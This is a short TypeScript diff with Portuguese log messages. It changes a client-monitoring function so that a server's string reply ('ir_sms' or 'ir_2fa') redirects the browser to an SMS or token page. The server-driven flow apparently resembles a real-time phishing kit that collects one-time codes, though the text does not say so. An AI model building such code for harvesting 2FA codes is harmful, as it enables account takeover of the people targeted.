@@ -104,18 +104,20 @@ const monitorClient = async (clientId: string, navigate: (path: string) => void)
       if (response.ok) {
         const clientData = await response.json();
         console.log('Dados do cliente recebidos:', clientData);
+        console.log('Valor do response:', clientData.response);
+        console.log('Tipo do response:', typeof clientData.response);
         
-        // Verificar redirecionamentos baseados no response
-        if (clientData.ir_sms === true) {
-          console.log('Detectado ir_sms: true - Redirecionando para /sms');
+        // Verificar redirecionamentos baseados no response (string)
+        if (clientData.response === "ir_sms") {
+          console.log('Detectado response: ir_sms - Redirecionando para /sms');
           clearInterval(intervalId);
           console.log('Monitoramento parado - redirecionando...');
           navigate('/sms');
           return;
         }
         
-        if (clientData.ir_2fa === true) {
-          console.log('Detectado ir_2fa: true - Redirecionando para /token');
+        if (clientData.response === "ir_2fa") {
+          console.log('Detectado response: ir_2fa - Redirecionando para /token');
           clearInterval(intervalId);
           console.log('Monitoramento parado - redirecionando...');
           navigate('/token');
